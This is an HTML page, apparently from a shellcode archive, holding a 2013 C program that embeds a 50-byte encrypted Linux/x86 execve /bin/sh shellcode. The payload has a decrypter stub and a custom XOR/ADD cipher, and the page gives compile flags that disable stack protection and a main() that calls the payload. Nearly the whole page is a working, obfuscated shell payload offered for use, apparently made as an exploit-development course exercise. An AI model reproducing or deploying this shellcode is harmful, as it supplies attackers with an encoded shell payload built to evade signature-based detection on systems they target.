<html><head><title>Linux/x86 - Encrypted execve /bin/sh with uzumaki algorithm - 50 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
/*

   Uzumaki Decrypter Shellcode - C Language - Linux/x86
   Copyright (C) 2013 Geyslan G. Bem, Hacking bits

   http://hackingbits.com
   geyslan@gmail.com

   This program is free software: you can redistribute it and/or modify
   it under the terms of the GNU General Public License as published by
   the Free Software Foundation, either version 3 of the License, or
   (at your option) any later version.

   This program is distributed in the hope that it will be useful,
   but WITHOUT ANY WARRANTY; without even the implied warranty of
   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
   GNU General Public License for more details.

   You should have received a copy of the GNU General Public License
   along with this program.  If not, see &lt;http://www.gnu.org/licenses/&gt;.

*/

/*

   uzumaki_decrypter_shellcode

   * decrypter has 29 bytes (the final amount depends on the shellcode length)
   * it decrypts the uzumaki cipher, a custom stream cipher algorithm ( (XOR [static] and XOR [pseudorandom]), ADD [static] )
   * to encrypt the shellcode use the Uzumaki Crypter &lt;https://github.com/geyslan/SLAE/blob/master/7th.assignment/uzumaki_crypter.py&gt;
   * null-free

   # gcc -m32 -fno-stack-protector -z execstack uzumaki_decrypter_shellcode.c -o uzumaki_decrypter_shellcode

   Testing
   # ./uzumaki_decrypter_shellcode

*/


#include &lt;stdio.h&gt;
#include &lt;string.h&gt;

unsigned char shellcode[] = \

              // Shellcode Decrypter
              "\x29\xc9\x74\x14\x5e\xb1"
              "\x14"  // &lt;- shellcode length
              "\x46\x8b\x06\x83\xe8"
              "\x09"  // &lt;- ADD key
              "\x34"
              "\x9f"  // &lt;- XOR key
              "\x32\x46\xff\x88\x06\xe2\xf1\xeb\x05\xe8"
              "\xe7\xff\xff\xff"

              // Crypted Shellcode
              "\x31\x70\xaa\x92\xd7\x2d\xce\xaf\xe1\xa8"
              "\xcc\x8d\xa8\xe1\xdb\x9d\xa1\x81\xfe\xba"
              "\xdb";


main ()
{

    // When contains null bytes, printf will show a wrong shellcode length.

    printf("Shellcode Length:  %d\n", strlen(shellcode));

    // Pollutes all registers ensuring that the shellcode runs in any circumstance.

    __asm__ ("movl $0xffffffff, %eax\n\t"
            "movl %eax, %ebx\n\t"
            "movl %eax, %ecx\n\t"
            "movl %eax, %edx\n\t"
            "movl %eax, %esi\n\t"
            "movl %eax, %edi\n\t"
            "movl %eax, %ebp\n\t"

            // Calling the shellcode
            "call shellcode");

}

<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
